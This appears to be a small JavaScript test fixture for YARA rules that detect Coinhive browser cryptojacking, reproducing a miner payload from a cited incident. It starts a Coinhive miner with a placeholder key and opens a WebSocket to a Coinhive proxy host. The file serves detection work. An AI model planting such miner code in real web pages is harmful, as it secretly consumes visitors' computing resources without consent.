// Test sample for YARA Coinhive detection rules
// This mimics the Coinhive JS payload from IR-2018-002

var miner = new CoinHive.Anonymous('SITE_KEY_12345678901234567890');
miner.start();

// Coinhive WebSocket connection pattern
var ws = new WebSocket('wss://ws001.coinhive.com/proxy');
ws.onmessage = function(event) {
    var hashrate = miner.getHashesPerSecond();
    console.log('Hashrate: ' + hashrate);
};
